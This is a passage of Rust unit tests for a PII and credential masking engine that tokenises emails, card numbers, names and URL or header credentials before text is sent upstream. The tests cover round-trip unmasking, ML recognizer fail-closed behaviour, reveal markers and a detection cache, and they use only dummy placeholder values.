            "host/path after userinfo must survive: {}",
            out.masked_text
        );
        assert!(out.masked_text.contains("postgres://"));

        // A scheme URL with a bare username (no `:password`) is NOT userinfo
        // credentials — the userinfo reading requires the `user:pass` colon. (Uses a
        // dotless host so the email recognizer doesn't independently grab `user@host`.)
        let nocolon = e
            .mask("deploy via ssh://deploy@server/srv now", Surface::UserMessage)
            .unwrap();
        assert!(
            !nocolon.masked_text.contains("[URL_CREDENTIAL_"),
            "bare user@host must not be a URL credential: {}",
            nocolon.masked_text
        );
        assert!(nocolon.masked_text.contains("ssh://deploy@server/srv"));
    }

    // Independence from the URL entity: the credential value is masked whether Network
    // is OFF (URL passes through) or ON (URL would also match) — overlap resolution
    // never lets the inner credential leak. Round-trips both ways.
    #[test]
    fn in_url_credential_masked_regardless_of_network_state() {
        let secret = "letMeIn-OPAQUE-pw";
        let text = format!("open https://svc.example.com/login?password={secret}");

        for network_on in [false, true] {
            let mut cfg = EngineConfig::default();
            if network_on {
                cfg.enabled_categories.insert(Category::Network);
            }
            let e = MaskEngine::new(cfg).unwrap();
            let out = e.mask(&text, Surface::UserMessage).unwrap();
            assert!(
                !out.masked_text.contains(secret),
                "credential leaked with network_on={network_on}: {}",
                out.masked_text
            );
            // Reversible round-trip.
            let back = e.unmask(&out.masked_text, &out.manifest).unwrap();
            assert_eq!(back, text, "round-trip failed with network_on={network_on}");
        }
    }

    // Regression battery for the ship-gate findings on the URL_CREDENTIAL recognizer.
    // Each case is at the Balanced default (Network off). Negatives assert NO credential
    // token; positives assert the secret VALUE is absent (not a brittle token match).
    #[test]
    fn in_url_credential_patch_battery() {
        let e = engine();
        let masks = |t: &str| e.mask(t, Surface::UserMessage).unwrap().masked_text;
        // Values are deliberately LOW-ENTROPY (`letmein…`, short digits) so the generic
        // high-entropy API_KEY catch-all does NOT mask them — any masking below is proof
        // the new context recognizer fired, not an entropy backstop. `[URL_CREDENTIAL_`
        // presence confirms the path.

        // F1 — JSON-quoted key (quote sits between name and `:`).
        let out = masks(r#"config {"token":"letmein"}"#);
        assert!(!out.contains("letmein"), "JSON cred leaked: {out}");
        assert!(out.contains("[URL_CREDENTIAL_"), "JSON path must fire: {out}");

        // F2 — single-level percent-encoded nested redirect (`%3F`/`%3D`).
        let out = masks("https://app/cb?next=https%3A%2F%2Fx%3Ftoken%3Dletmein-nested");
        assert!(!out.contains("letmein-nested"), "encoded nested cred leaked: {out}");
        assert!(out.contains("[URL_CREDENTIAL_"), "encoded path must fire: {out}");

        // F2b (round-2) — fully percent-encoded JSON fragment (encoded quotes).
        let out = masks("cb?state=%7B%22token%22%3A%22letmein%22%7D");
        assert!(!out.contains("letmein"), "encoded-JSON cred leaked: {out}");
        assert!(out.contains("[URL_CREDENTIAL_"), "encoded-JSON path must fire: {out}");

        // F3 — previously-missing common names.
        for (t, secret) in [
            ("clone with ?pat=letmein-pat", "letmein-pat"),
            ("login ?otp=314159 now", "314159"),
            ("dsn ?session_id=letmein-sess", "letmein-sess"),
            ("aws ?access_key_id=letmein-akid set", "letmein-akid"),
        ] {
            let out = masks(t);
            assert!(!out.contains(secret), "missing-name cred leaked ({secret}): {out}");
            assert!(out.contains("[URL_CREDENTIAL_"), "name {secret} must fire: {out}");
        }

        // F4 — bare `key` / uncurated `*-key` must NOT be masked (FP). Text survives verbatim.
        for benign in [
            "ORDER BY sort-key=colname",
            "public-key=id_rsa.pub",
            "the map key: colname here",
        ] {
            let out = masks(benign);
            assert!(
                !out.contains("[URL_CREDENTIAL_"),
                "bare key false-positive: {out}"
            );
            assert_eq!(out, benign, "benign key text must survive verbatim");
        }
        // ...but a curated hyphenated form (api-key) IS still caught.
        let out = masks("send ?api-key=letmein-apikey here");
        assert!(!out.contains("letmein-apikey"), "api-key must mask: {out}");
        assert!(out.contains("[URL_CREDENTIAL_"));

        // F5 — comma in a secret value does not leak its tail (`,` not a terminator).
        let out = masks("GET https://h/p?token=ab,cd,ef&id=1");
        assert!(!out.contains("ab,cd,ef"), "comma-value tail leaked: {out}");
        assert!(out.contains("&id=1"), "trailing param must survive: {out}");

        // F6 — password-only DSN: the credential does not leak end-to-end (here the
        // whole authority is masked by the API_KEY backstop; the userinfo recognizer's
        // exact span is proven in recognizers.rs `url_credential_value_only_spans`).
        let out = masks("redis://:letmein@cache/0");
        assert!(!out.contains("letmein"), "password-only DSN leaked: {out}");

        // F7 (round-3) — non-Bearer Authorization header: the credential after the scheme is
        // masked, not just the `Basic` word (low-entropy value ⇒ proves URL_CREDENTIAL fired).
        let out = masks("Authorization: Basic letmein-basic now");
        assert!(!out.contains("letmein-basic"), "Basic-scheme credential leaked: {out}");
        assert!(out.contains("[URL_CREDENTIAL_"), "Basic scheme skip must fire: {out}");

        // F8 (round-3) — DOUBLE percent-encoded redirect: decoded across levels so the
        // low-entropy nested credential is caught.
        let out = masks("cb?next=https%253A%252F%252Fx%253Ftoken%253Dletmein-dbl");
        assert!(!out.contains("letmein-dbl"), "double-encoded cred leaked: {out}");
        assert!(out.contains("[URL_CREDENTIAL_"), "double-encoded path must fire: {out}");

        // F9 (round-4) — JSON-quoted Authorization value: opening quote consumed before the
        // scheme skip, so the credential (not the `Basic` word) is masked.
        let out = masks(r#"hdrs {"authorization":"Basic letmein-q"}"#);
        assert!(!out.contains("letmein-q"), "quoted Basic auth leaked: {out}");
        assert!(out.contains("[URL_CREDENTIAL_"), "quoted-auth path must fire: {out}");

        // F10 (round-4) — MIXED encoding: separator single-encoded (`%3D`), a value-internal
        // `&` double-encoded (`%2526`). The whole value is visible only at the INTERMEDIATE
        // decode level, so per-level scanning masks it whole — the tail must not leak.
        let out = masks("cb x%3Ftoken%3Dletmein%2526tailz end");
        assert!(!out.contains("tailz"), "intermediate-level cred tail leaked: {out}");
        assert!(out.contains("[URL_CREDENTIAL_"), "intermediate-level path must fire: {out}");
    }

    // The control token is derived from the key (stable for a key) but is NOT the
    // key itself, so the state file it lands in carries no decryption material.
    #[test]
    fn control_token_is_decoupled_from_key() {
        let key = [7u8; 32];
        let salt = [9u8; 16];
        let e = MaskEngine::with_session(EngineConfig::default(), key, salt).unwrap();
        let tok = e.control_token();
        assert_eq!(tok.len(), 64, "blake3 → 64 hex");
        let key_hex: String = key.iter().map(|b| format!("{b:02x}")).collect();
        assert_ne!(tok, key_hex, "control token must not be the AES key");
        assert_eq!(tok, e.control_token(), "stable for the same key");

        // `with_salt` mints a fresh random key each time → distinct control tokens,
        // confirming the key (not just the token) is fresh and unpersisted.
        let a = MaskEngine::with_salt(EngineConfig::default(), salt).unwrap();
        let b = MaskEngine::with_salt(EngineConfig::default(), salt).unwrap();
        assert_ne!(a.control_token(), b.control_token());
    }

    #[test]
    fn snap_widens_off_boundary_spans() {
        let s = "héllo"; // 'é' occupies bytes 1..3
        assert_eq!(
            snap_to_char_boundary(s, 2, 2),
            (1, 3),
            "mid-char snaps outward"
        );
        assert_eq!(
            snap_to_char_boundary("hello", 1, 3),
            (1, 3),
            "aligned is unchanged"
        );
        let n = s.len();
        assert_eq!(
            snap_to_char_boundary(s, n + 5, n + 9),
            (n, n),
            "clamps past end"
        );
    }

    // Multibyte text around the match must not panic and must round-trip exactly
    // (the snap guard is a no-op here since presidio offsets are char-aligned).
    #[test]
    fn mask_round_trips_with_multibyte_text() {
        let e = engine();
        let original = "café 🎉 mail bob@example.com please";
        let out = e.mask(original, Surface::UserMessage).unwrap();
        assert!(!out.masked_text.contains("bob@example.com"));
        assert!(out.masked_text.contains("café") && out.masked_text.contains('🎉'));
        assert_eq!(e.unmask(&out.masked_text, &out.manifest).unwrap(), original);
    }

    // Master switch off ⇒ mask path is a transparent passthrough, but already
    // minted tokens still unmask on the response path.
    #[test]
    fn disabled_passes_through_but_still_unmasks() {
        let e = engine();
        // Mint a token while enabled.
        let on = e
            .mask("ping alice@example.com", Surface::UserMessage)
            .unwrap();
        let token = on.manifest.entries[0].token_handle.clone();

        // Now disable: a fresh outbound field is NOT masked.
        e.set_enabled(false);
        assert!(!e.is_enabled());
        let off = e
            .mask("ping bob@example.com", Surface::UserMessage)
            .unwrap();
        assert_eq!(
            off.masked_text, "ping bob@example.com",
            "should pass through verbatim"
        );
        assert!(off.manifest.is_empty());

        // ...yet the earlier token still decodes (unmask is not gated).
        let restored = e
            .unmask(&format!("reply to {token}"), &on.manifest)
            .unwrap();
        assert_eq!(restored, "reply to alice@example.com");

        // Re-enable and masking resumes, deterministically (same token as before).
        e.set_enabled(true);
        let again = e
            .mask("ping alice@example.com", Surface::UserMessage)
            .unwrap();
        assert_eq!(
            again.masked_text, on.masked_text,
            "determinism survives the toggle"
        );
    }

    // Live policy swap takes effect immediately and keeps the store (determinism).
    #[test]
    fn set_config_swaps_policy_live() {
        let e = engine();
        let before = e
            .mask("card 4111111111111111", Surface::UserMessage)
            .unwrap();
        assert!(
            before.masked_text.contains("************1111"),
            "default masks CC last-4 (compiled built-in): {}",
            before.masked_text
        );

        // Swap to a config that tokenizes CC (reversible) instead of the built-in mask.
        let mut cfg = e.config_snapshot();
        cfg.entity_operators
            .insert("CREDIT_CARD".into(), Operator::Token);
        e.set_config(cfg).unwrap();

        let after = e
            .mask("card 4111111111111111", Surface::UserMessage)
            .unwrap();
        assert!(
            after.masked_text.contains("[CREDIT_CARD_"),
            "got: {}",
            after.masked_text
        );
    }

    #[test]
    fn fail_closed_false_is_ignored_for_live_policy() {
        let mut cfg = EngineConfig {
            fail_closed: false,
            ..EngineConfig::default()
        };
        let e = MaskEngine::new(cfg.clone()).unwrap();
        assert!(
            e.config_snapshot().fail_closed,
            "constructor must normalize deprecated fail_closed=false"
        );

        cfg.fail_closed = false;
        e.set_config(cfg).unwrap();
        assert!(
            e.config_snapshot().fail_closed,
            "live config swap must not weaken detection-error policy"
        );
    }

    // ----- ML recognizer wiring (driven via the public slot API; no model) -----

    use presidio_core::{EntityType, NlpArtifacts, Recognizer, RecognizerResult};

    /// A stand-in `Recognizer` that flags a fixed name as a `PERSON` — lets us
    /// exercise the ML detection path without loading a real model.
    struct MockPerson {
        entities: Vec<EntityType>,
        name: &'static str,
    }
    impl MockPerson {
        fn new(name: &'static str) -> Self {
            Self {
                entities: vec!["PERSON".parse().unwrap()],
                name,
            }
        }
    }
    impl Recognizer for MockPerson {
        fn name(&self) -> &str {
            "mock-person"
        }
        fn supported_entities(&self) -> &[EntityType] {
            &self.entities
        }
        fn supported_languages(&self) -> &[&str] {
            &["en"]
        }
        fn analyze(
            &self,
            text: &str,
            _e: Option<&[EntityType]>,
            _n: Option<&NlpArtifacts>,
        ) -> Vec<RecognizerResult> {
            match text.find(self.name) {
                Some(pos) => vec![
                    RecognizerResult::new(
                        "PERSON".parse().unwrap(),
                        pos,
                        pos + self.name.len(),
                        0.99,
                    )
                    .with_recognizer("mock-person"),
                ],
                None => Vec::new(),
            }
        }
    }

    fn engine_personal_on() -> MaskEngine {
        let mut cfg = EngineConfig::default();
        cfg.enabled_categories.insert(Category::Personal);
        MaskEngine::new(cfg).unwrap()
    }

    // A Ready recognizer masks its entity (when the category is on) and round-trips;
    // disabling it live makes the same text pass through unmasked.
    #[test]
    fn ml_recognizer_masks_when_ready_then_off() {
        let e = engine_personal_on();
        let generation = e.ml_begin_load(MlConfig {
            enabled: true,
            ..Default::default()
        });
        e.ml_set_ready(
            generation,
            Arc::new(InfallibleMl(Arc::new(MockPerson::new("Alice Johnson")))),
        );
        assert!(e.ml_active());

        let original = "please call Alice Johnson today";
        let out = e.mask(original, Surface::UserMessage).unwrap();
        assert!(
            out.masked_text.contains("[PERSON_"),
            "ml PERSON not masked: {}",
            out.masked_text
        );
        assert!(!out.masked_text.contains("Alice Johnson"));
        assert_eq!(e.unmask(&out.masked_text, &out.manifest).unwrap(), original);

        // Live off: recognizer dropped, name flows through.
        e.ml_disable();
        assert!(!e.ml_active());
        let off = e.mask(original, Surface::UserMessage).unwrap();
        assert!(
            off.masked_text.contains("Alice Johnson"),
            "ml off should not mask: {}",
            off.masked_text
        );
    }

    // Loading state (not Ready) ⇒ recognizer is NOT consulted yet (regex-only).
    #[test]
    fn ml_loading_does_not_mask_yet() {
        let e = engine_personal_on();
        e.ml_begin_load(MlConfig {
            enabled: true,
            ..Default::default()
        });
        assert!(!e.ml_active(), "Loading is not active");
        let out = e.mask("call Alice Johnson", Surface::UserMessage).unwrap();
        assert!(
            out.masked_text.contains("Alice Johnson"),
            "must be regex-only while loading: {}",
            out.masked_text
        );
    }

    // Strict mode (`[engine.ml] required = true`): ML enabled but not Ready ⇒
    // mask REFUSES (fail-closed) instead of degrading to regex-only — while
    // Loading AND after a Failed load. Once Ready it masks normally, and with
    // `required = false` the same not-Ready states degrade (the historical
    // hot-load behavior, pinned by `ml_loading_does_not_mask_yet` above).
    #[test]
    fn required_refuses_when_ml_not_ready() {
        let e = engine_personal_on();
        let strict = MlConfig {
            enabled: true,
            required: true,
            ..Default::default()
        };

        // Loading ⇒ refuse.
        let generation = e.ml_begin_load(strict.clone());
        let err = e
            .mask("call Alice Johnson", Surface::UserMessage)
            .expect_err("required + Loading must refuse, not degrade");
        assert!(err.to_string().contains("ml required"), "got: {err}");

        // Failed ⇒ still refuse (a dead endpoint must not silently fail open).
        e.ml_set_failed(generation, "endpoint down".into());
        let err = e
            .mask("call Alice Johnson", Surface::UserMessage)
            .expect_err("required + Failed must refuse");
        assert!(err.to_string().contains("endpoint down"), "got: {err}");

        // Ready ⇒ masks normally.
        let generation = e.ml_begin_load(strict);
        e.ml_set_ready(
            generation,
            Arc::new(InfallibleMl(Arc::new(MockPerson::new("Alice Johnson")))),
        );
        let out = e.mask("call Alice Johnson", Surface::UserMessage).unwrap();
        assert!(out.masked_text.contains("[PERSON_"));
    }

    // A runtime recognizer failure (post-Ready) refuses the request, records
    // itself in the snapshot — and does NOT demote the status (demotion would
    // drop the recognizer and fail OPEN). The next successful detection clears it.
    #[test]
    fn runtime_failure_is_surfaced_not_demoted() {
        struct FlakyMl {
            fail: std::sync::atomic::AtomicBool,
        }
        impl ml_api::MlRecognizer for FlakyMl {
            fn analyze(&self, _text: &str) -> Result<Vec<RecognizerResult>, EngineError> {
                if self.fail.load(Ordering::SeqCst) {
                    Err(EngineError::Ml("endpoint unreachable".into()))
                } else {
                    Ok(Vec::new())
                }
            }
        }
        let e = engine_personal_on();
        let generation = e.ml_begin_load(MlConfig {
            enabled: true,
            ..Default::default()
        });
        let flaky = Arc::new(FlakyMl {
            fail: std::sync::atomic::AtomicBool::new(true),
        });
        e.ml_set_ready(generation, flaky.clone());

        // Failure: request refused; status stays Ready; snapshot carries the error.
        assert!(e.mask("call Alice Johnson", Surface::UserMessage).is_err());
        let snap = e.ml_snapshot();
        assert_eq!(snap.status, MlStatus::Ready, "must NOT demote (fail-open)");
        assert_eq!(snap.runtime_failures, 1);
        assert!(
            snap.last_runtime_error
                .as_deref()
                .is_some_and(|m| m.contains("endpoint unreachable")),
            "got: {snap:?}"
        );

        // Recovery: a successful ML detection clears the note.
        flaky.fail.store(false, Ordering::SeqCst);
        assert!(e.mask("call Alice Johnson", Surface::UserMessage).is_ok());
        let snap = e.ml_snapshot();
        assert_eq!(snap.status, MlStatus::Ready);
        assert!(snap.last_runtime_error.is_none(), "cleared on recovery");
    }

    // Runtime-failure bookkeeping is tied to the recognizer GENERATION that
    // produced it (audit). A slow result from an OLD recognizer must not mark a
    // newly reloaded slot as failing, and a stale success must not clear a NEW
    // recognizer's real failure. Both note and clear silently no-op on a mismatch.
    #[test]
    fn stale_generation_failure_is_ignored() {
        let e = engine_personal_on();
        let cfg = MlConfig {
            enabled: true,
            ..Default::default()
        };

        // First recognizer (generation g1), then a disable + a fresh load (g2) so the
        // live generation no longer matches g1.
        let g1 = e.ml_begin_load(cfg.clone());
        e.ml_set_ready(
            g1,
            Arc::new(InfallibleMl(Arc::new(MockPerson::new("Alice Johnson")))),
        );
        e.ml_disable();
        let g2 = e.ml_begin_load(cfg);
        e.ml_set_ready(
            g2,
            Arc::new(InfallibleMl(Arc::new(MockPerson::new("Alice Johnson")))),
        );
        assert_ne!(g1, g2, "the reload must have bumped the generation");

        // A failure attributed to the OLD generation is dropped — the new slot is clean.
        e.ml_note_runtime_failure(g1, "stale");
        let snap = e.ml_snapshot();
        assert_eq!(
            snap.runtime_failures, 0,
            "stale-gen failure must not record"
        );
        assert!(
            snap.last_runtime_error.is_none(),
            "stale-gen failure must not surface: {snap:?}"
        );

        // A failure on the CURRENT generation records normally.
        e.ml_note_runtime_failure(g2, "real");
        let snap = e.ml_snapshot();
        assert_eq!(snap.runtime_failures, 1);
        assert!(
            snap.last_runtime_error
                .as_deref()
                .is_some_and(|m| m.contains("real")),
            "got: {snap:?}"
        );

        // A stale success (old generation) must NOT clear the new recognizer's failure.
        e.ml_clear_runtime_failure(g1);
        assert!(
            e.ml_snapshot().last_runtime_error.is_some(),
            "stale-gen clear must not wipe a current failure"
        );

        // A success on the CURRENT generation clears it.
        e.ml_clear_runtime_failure(g2);
        assert!(
            e.ml_snapshot().last_runtime_error.is_none(),
            "current-gen clear must take effect"
        );
    }

    // `required` is refusal POLICY, not recognizer identity: flipping it applies
    // LIVE via `ml_update_required` (no reload, recognizer untouched). The flip is
    // read by `ml_for_mask` on the very next request, so strictness changes
    // immediately in both directions — a Ready recognizer keeps masking, while a
    // not-Ready slot starts refusing.
    #[test]
    fn required_flip_applies_live_without_reload() {
        // Ready recognizer, lax to start: masks normally; flipping `required` on does
        // not refuse (status is Ready) and IS reflected in the snapshot's desired.
        let ready = engine_personal_on();
        let generation = ready.ml_begin_load(MlConfig {
            enabled: true,
            required: false,
            ..Default::default()
        });
        ready.ml_set_ready(
            generation,
            Arc::new(InfallibleMl(Arc::new(MockPerson::new("Alice Johnson")))),
        );
        assert!(
            ready
                .mask("call Alice Johnson", Surface::UserMessage)
                .is_ok()
        );

        ready.ml_update_required(true);
        let out = ready
            .mask("call Alice Johnson", Surface::UserMessage)
            .expect("Ready + required must still mask, not refuse");
        assert!(out.masked_text.contains("[PERSON_"));
        assert!(
            ready.ml_snapshot().desired.is_some_and(|d| d.required),
            "the live flip must be reflected in desired.required"
        );

        // Not-ready slot (Loading), lax to start: masks regex-only. Flipping
        // `required` on makes the very next request REFUSE — no reload, just the live
        // policy read in `ml_for_mask`.
        let loading = engine_personal_on();
        loading.ml_begin_load(MlConfig {
            enabled: true,
            required: false,
            ..Default::default()
        });
        assert!(
            loading
                .mask("call Alice Johnson", Surface::UserMessage)
                .is_ok(),
            "Loading + lax must proceed regex-only"
        );

        loading.ml_update_required(true);
        let err = loading
            .mask("call Alice Johnson", Surface::UserMessage)
            .expect_err("Loading + required (live flip) must refuse");
        assert!(
            err.to_string().contains("ml required but not ready"),
            "got: {err}"
        );
    }

    // Generation guard: a load that completes AFTER an off / model change must not
    // resurrect a recognizer (the critical race from the adversarial review).
    #[test]
    fn ml_stale_load_completion_is_discarded() {
        let e = engine_personal_on();
        let stale_gen = e.ml_begin_load(MlConfig {
            enabled: true,
            ..Default::default()
        });
        // User turns it off (or changes the model) while the first load is in flight.
        e.ml_disable();
        // The stale load now finishes and tries to install its recognizer.
        e.ml_set_ready(
            stale_gen,
            Arc::new(InfallibleMl(Arc::new(MockPerson::new("Alice Johnson")))),
        );
        assert!(
            !e.ml_active(),
            "stale load must not become active after disable"
        );
        let out = e.mask("call Alice Johnson", Surface::UserMessage).unwrap();
        assert!(
            out.masked_text.contains("Alice Johnson"),
            "stale load leaked"
        );
    }

    // DATE_TIME (the ML model's `private_date`) is intentionally unmapped to any
    // category — dates are noisy — so it's dropped by default but opt-in via an
    // explicit per-type operator. Lock that decision (review follow-up).
    #[test]
    fn date_time_unmapped_by_default_but_opt_in() {
        let cfg = EngineConfig::default();
        assert!(
            !cfg.entity_enabled("DATE_TIME"),
            "DATE_TIME must be off by default"
        );
        for c in Category::ALL {
            assert!(
                !c.entity_types().contains(&"DATE_TIME"),
                "{c:?} unexpectedly lists DATE_TIME"
            );
        }
        // Opt-in escape hatch: an explicit per-type operator enables it.
        let mut cfg = EngineConfig::default();
        cfg.entity_operators
            .insert("DATE_TIME".into(), Operator::Token);
        assert!(
            cfg.entity_enabled("DATE_TIME"),
            "an entity_operator should enable DATE_TIME"
        );
    }

    // Lock the ML status wire strings — the status line and the hooks CLI match on
    // exactly these (a rename here would silently break the indicator).
    #[test]
    fn ml_status_serializes_to_stable_strings() {
        use serde_json::json;
        assert_eq!(
            serde_json::to_value(MlStatus::Disabled).unwrap(),
            json!("disabled")
        );
        assert_eq!(
            serde_json::to_value(MlStatus::Loading).unwrap(),
            json!("loading")
        );
        assert_eq!(
            serde_json::to_value(MlStatus::Ready).unwrap(),
            json!("ready")
        );
        assert_eq!(
            serde_json::to_value(MlStatus::Failed).unwrap(),
            json!("failed")
        );
    }

    // Lock the catalog mapping target strings: the ML model maps its labels to
    // `EntityType`s whose `Display` MUST equal the category entity strings, else ML
    // detections would be silently dropped by the category gate.
    #[test]
    fn entity_type_display_matches_category_strings() {
        for (parsed, expected, cat) in [
            ("PERSON", "PERSON", Category::Personal),
            ("LOCATION", "LOCATION", Category::Personal),
            ("EMAIL_ADDRESS", "EMAIL_ADDRESS", Category::Contact),
            ("PHONE_NUMBER", "PHONE_NUMBER", Category::Contact),
            ("US_BANK_ACCOUNT", "US_BANK_NUMBER", Category::Financial),
            ("API_KEY", "API_KEY", Category::Secrets),
            // Regression guard for the alias-vs-Display silent-drop bug: each LHS is a
            // parse alias; the category must list the canonical Display (RHS).
            ("IBAN", "IBAN_CODE", Category::Financial),
            ("CRYPTO_WALLET", "CRYPTO", Category::Financial),
            (
                "US_ROUTING_NUMBER",
                "ABA_ROUTING_NUMBER",
                Category::Financial,
            ),
            ("US_MEDICAL_LICENSE", "MEDICAL_LICENSE", Category::Identity),
        ] {
            let et: EntityType = parsed.parse().unwrap();
            assert_eq!(et.to_string(), expected, "Display drift for {parsed}");
            assert!(
                cat.entity_types().contains(&expected),
                "{expected} missing from its category"
            );
        }
    }

    // ----- Reveal marker (display-time decoration of un-masked assistant text) ---

    fn engine_with_marker(prefix: &str, suffix: &str) -> MaskEngine {
        let cfg = EngineConfig {
            reveal_marker: RevealMarker {
                enabled: true,
                prefix: prefix.to_string(),
                suffix: suffix.to_string(),
            },
            ..EngineConfig::default()
        };
        MaskEngine::new(cfg).unwrap()
    }

    // `unmask_assistant` wraps every value it RESOLVES; plain `unmask` never does.
    #[test]
    fn reveal_marker_wraps_assistant_unmask_only() {
        let e = engine_with_marker("<", ">");
        let m = e
            .mask("mail bob@example.com", Surface::UserMessage)
            .unwrap();
        let tok = m.manifest.entries[0].token_handle.clone();
        let line = format!("write to {tok} now");

        let decorated = e.unmask_assistant(&line, &m.manifest).unwrap();
        assert_eq!(decorated, "write to <bob@example.com> now");

        // Plain unmask (tool input / compaction path) is undecorated.
        let plain = e.unmask(&line, &m.manifest).unwrap();
        assert_eq!(plain, "write to bob@example.com now");
    }

    // An UNKNOWN token (not in the manifest or store) is left verbatim — never
    // wrapped, so we never decorate a value we didn't actually reveal.
    #[test]
    fn reveal_marker_leaves_unknown_token_verbatim() {
        let e = engine_with_marker("<", ">");
        let m = UnmaskManifest::new();
        let line = "ghost [EMAIL_ADDRESS_deadbeef0000] here";
        assert_eq!(e.unmask_assistant(line, &m).unwrap(), line);
    }

    // Disabled marker ⇒ `unmask_assistant` == `unmask` (no behavior change; this is
    // why every pre-existing default-config test stays green).
    #[test]
    fn reveal_marker_disabled_is_plain_unmask() {
        // Marker explicitly OFF (it is ON by default); with no marker, the assistant
        // and plain un-mask paths must produce identical bytes.
        let e = MaskEngine::new(EngineConfig {
            reveal_marker: RevealMarker {
                enabled: false,
                ..Default::default()
            },
            ..EngineConfig::default()
        })
        .unwrap();
        let m = e
            .mask("mail bob@example.com", Surface::UserMessage)
            .unwrap();
        let tok = m.manifest.entries[0].token_handle.clone();
        let line = format!("to {tok}");
        assert_eq!(
            e.unmask_assistant(&line, &m.manifest).unwrap(),
            e.unmask(&line, &m.manifest).unwrap()
        );
    }

    // THE transparency invariant: a wrapped reply re-sent as assistant history masks
    // to BYTE-IDENTICAL bytes as masking the bare token — the decoration adds zero
    // noise upstream. Proven with an ANSI marker whose prefix ends in a word char
    // (`m`), the worst case for naive token-adjacent stripping.
    #[test]
    fn reveal_marker_strips_on_resend_byte_identical() {
        let e = engine_with_marker("\u{1b}[97;44m", "\u{1b}[0m");

        // Turn 1: a value is minted, then revealed+wrapped for display.
        let t1 = e
            .mask("contact alice@example.com", Surface::UserMessage)
            .unwrap();
        let tok = t1.manifest.entries[0].token_handle.clone();
        let reply_tokenized = format!("I'll email {tok} today");
        let shown = e.unmask_assistant(&reply_tokenized, &t1.manifest).unwrap();
        assert!(shown.contains("\u{1b}[97;44malice@example.com\u{1b}[0m"));

        // Turn 2: Claude Code re-sends that shown reply as assistant history.
        let resent = e.mask(&shown, Surface::AssistantText).unwrap();
        // Baseline: what the bare token would have masked to with no marker at all.
        let baseline = e.mask(&reply_tokenized, Surface::AssistantText).unwrap();
        assert_eq!(
            resent.masked_text, baseline.masked_text,
            "re-sent assistant history must be byte-identical to the un-decorated token: {:?}",
            resent.masked_text
        );
        // And concretely: the email is a clean token, no stray ANSI bytes survive.
        assert!(resent.masked_text.contains(&tok));
        assert!(!resent.masked_text.contains('\u{1b}'));
        assert!(!resent.masked_text.contains("alice@example.com"));
    }

    // The reveal marker is display/apply-time: a live change must NOT move the
    // detection fingerprint (the cache must survive toggling the decoration).
    #[test]
    fn reveal_marker_not_in_detection_fingerprint() {
        let base = EngineConfig::default().detection_fingerprint();
        let cfg = EngineConfig {
            reveal_marker: RevealMarker {
                enabled: true,
                prefix: "<<".into(),
                suffix: ">>".into(),
            },
            ..EngineConfig::default()
        };
        assert_eq!(
            base,
            cfg.detection_fingerprint(),
            "reveal_marker must not affect the detection fingerprint"
        );
    }

    // The strip is assistant-surface-only and token-faithful: it must NOT mangle a
    // user message that legitimately contains the marker bytes around non-PII.
    #[test]
    fn reveal_marker_strip_is_assistant_surface_only() {
        let e = engine_with_marker("$", "$");
        // A user types literal `$`; that surface is never stripped, so the `$` survive
        // (the strip is AssistantText-only — we only peel decoration WE added).
        let user = e
            .mask("the price is $5 to $10", Surface::UserMessage)
            .unwrap();
        assert!(
            user.masked_text.contains("$5") && user.masked_text.contains("$10"),
            "user-surface `$` must not be stripped: {:?}",
            user.masked_text
        );
    }

    // Any surface label can be masked (no direction gate); unmask round-trips.
    #[test]
    fn assistant_surface_masks_and_round_trips() {
        let e = engine();
        let original = "I emailed dave@example.com for you";
        let out = e.mask(original, Surface::AssistantText).unwrap();
        assert!(out.masked_text.contains("[EMAIL_ADDRESS_"));
        assert_eq!(e.unmask(&out.masked_text, &out.manifest).unwrap(), original);
    }

    // ----- Detection cache (Component 1) — committed-scope verification --------

    // A repeated identical leaf hits the cache, reproduces the masked text, and
    // REPLAYS the manifest (not a cached-empty) so it still unmasks.
    #[test]
    fn cache_hit_is_deterministic_and_replays_manifest() {
        let e = engine();
        let text = "email alice@example.com and bob@example.com";
        let a = e.mask(text, Surface::UserMessage).unwrap();
        assert_eq!(a.stats.fresh_miss, 1, "first mask is a miss");
        assert_eq!(a.stats.hit, 0);
        let b = e.mask(text, Surface::UserMessage).unwrap();
        assert_eq!(b.stats.hit, 1, "second identical mask is a cache hit");
        assert_eq!(b.stats.fresh_miss, 0);
        assert_eq!(
            a.masked_text, b.masked_text,
            "hit reproduces the masked text"
        );
        assert!(
            !b.manifest.is_empty(),
            "manifest is REPLAYED on a hit, not cached empty"
        );
        assert_eq!(a.manifest.len(), b.manifest.len());
        assert_eq!(e.unmask(&b.masked_text, &b.manifest).unwrap(), text);
    }

    // Manifest-replay regression: a custom literal token (which does NOT match
    // `token_regex`) unmasks ONLY via the replayed per-call manifest, so it must
    // survive a cache hit.
    #[test]
    fn literal_token_round_trips_through_a_cache_hit() {
        let mut cfg = EngineConfig::default();
        cfg.custom_replacements.push(CustomReplacement {
            pattern: "ACME-CODENAME".into(),
            entity_type: "CODENAME".into(),
            is_regex: false,
            case_sensitive: true,
            priority: 0,
            literal_token: true,
            token: Some("[CODENAME_acme]".into()),
            apply_to_surfaces: None,
        });
        let e = MaskEngine::new(cfg).unwrap();
        let text = "deploy ACME-CODENAME now";
        let first = e.mask(text, Surface::UserMessage).unwrap();
        assert_eq!(first.stats.fresh_miss, 1);
        let second = e.mask(text, Surface::UserMessage).unwrap();
        assert_eq!(second.stats.hit, 1, "second mask is a hit");
        assert!(second.masked_text.contains("[CODENAME_acme]"));
        assert_eq!(
            e.unmask(&second.masked_text, &second.manifest).unwrap(),
            text
        );
    }

    // Operators are resolved at APPLY time: swapping an operator VALUE (same key)
    // takes effect on the same text WITHOUT a detection re-run (cache hit).
    #[test]
    fn operator_value_swap_applies_without_redetection() {
        let mut cfg = EngineConfig::default();
        // Pre-establish the EMAIL operator KEY so a later value swap leaves the
        // detection fingerprint intact.
        cfg.entity_operators
            .insert("EMAIL_ADDRESS".into(), Operator::Token);
        let e = MaskEngine::new(cfg).unwrap();
        let text = "mail carol@example.com";
        let first = e.mask(text, Surface::UserMessage).unwrap();
        assert_eq!(first.stats.fresh_miss, 1);
        assert!(first.masked_text.contains("[EMAIL_ADDRESS_"));

        let mut cfg2 = e.config_snapshot();
        cfg2.entity_operators
            .insert("EMAIL_ADDRESS".into(), Operator::Redact);
        e.set_config(cfg2).unwrap();

        let second = e.mask(text, Surface::UserMessage).unwrap();
        assert_eq!(
            second.stats.hit, 1,
            "an operator VALUE change must NOT bust the cache"
        );
        assert_eq!(second.stats.fresh_miss, 0);
        assert!(
            second.masked_text.contains("[REDACTED]"),
            "the new operator resolves at apply-time: {}",
            second.masked_text
        );
    }

